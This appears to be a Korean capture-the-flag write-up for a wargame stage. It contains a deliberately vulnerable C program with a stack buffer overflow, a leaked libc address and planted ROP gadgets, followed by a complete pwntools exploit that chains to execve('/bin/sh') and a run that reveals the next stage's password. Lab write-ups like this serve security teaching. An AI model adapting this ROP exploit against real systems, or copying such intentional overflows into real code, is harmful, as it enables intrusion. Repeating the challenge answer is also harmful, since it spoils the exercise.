https://github.com/hspace-io/Space_Alone/blob/main/problems/Chapter04/ch4.c
```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char MasterKey[16] = "/bin/sh";

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void gadget() {
    asm("pop %rdi; ret");
    asm("pop %rsi; pop %r15; ret");
    asm("pop %rdx; ret");
    }

void welcom(){
    printf("Welcome to the shop\n");
    printf("[1] Vegetable Display\n");
    printf("[2] Frozen Food Display\n");
    printf("[3] Ramen/Snack Display\n");
}

int main(int argc, char *argv[]){

    int select;
    char buf[0x40]={};
    initialize();
    welcom();

    printf("Choose the display stand : ");
    scanf("%d", &select);
    if(select == 1 || select == 3)
    {
        printf("Remaining quantity : 0");
        printf("There are no items left.");
    }
    else if(select == 2)
    {
        printf("Remaining quantity : 30\n");
        printf("Frozen food is stored in the freezer warehouse.\n");
        printf("Address of freezer warehouse : %p\n", &read);
        printf("Please select the quantity of the item : ");
        read(0,buf,0x400);
    }



    write(1, buf, sizeof(buf));

    return 0;
}
```

```
Scavening_for_Survival@hsapce-io:~$ checksec ./stage4
[*] '/home/Scavening_for_Survival/stage4'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

``main()`` 함수에서 2번을 선택하면, ``char buf[0x40]={};``인데, ``read(0,buf,0x400);``를 하는 마법을 볼 수 있다.  
이번에도 Stack-Based Buffer Overflow가 발생하고, 심지어 이번엔 read이므로 널 바이트나 개행문자들도 포함할 수 있다.  
그러나 NX가 켜져 있어 쉘코드는 사용하지 못한다.  

그러나 문제에서 read의 주소를 알려주고, 유용한 가젯들과 /bin/sh 문자열도 제공해주기 때문에, 쉽게 ROP를 사용해 Shell을 획득할 수 있다.  

방법이 여러가지가 있겠지만, 그냥 ``execve("/bin/sh", 0, 0);``을 호출하는 ROP 체인을 작성하기로 결정했다.  

익스플로잇은 아래와 같다:
```
from pwn import *

p = process('./stage4')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = 0x401215
pop_rsi_r15 = 0x401217
pop_rdx = 0x40121b

binsh = 0x404050

p.sendlineafter(b"Choose the display stand : ", b'2')
p.recvuntil(b"Address of freezer warehouse : ")
libc_base = int(p.recv(14), 16) - libc.symbols['read']
execve = libc_base + libc.symbols['execve']

payload = b'A' * 0x50
payload += b'B' * 0x8
payload += p64(pop_rdi) + p64(binsh)
payload += p64(pop_rsi_r15) + p64(0) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(execve)

p.send(payload)

p.interactive()
```

위의 익스플로잇을 사용하여 Shell을 획득하였다.  
status 명령어로 Chapter 5 유저의 PW를 확인하면 된다.  

```
Scavening_for_Survival@hsapce-io:~$ python3 expl.py
[+] Starting local process './stage4': pid 3569
[*] Switching to interactive mode

Please select the quantity of the item : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ status
UID: 505
Chapter5 PW: i_gROPed_for_food_in_the_dark
■■■■■■■□□□
$
```
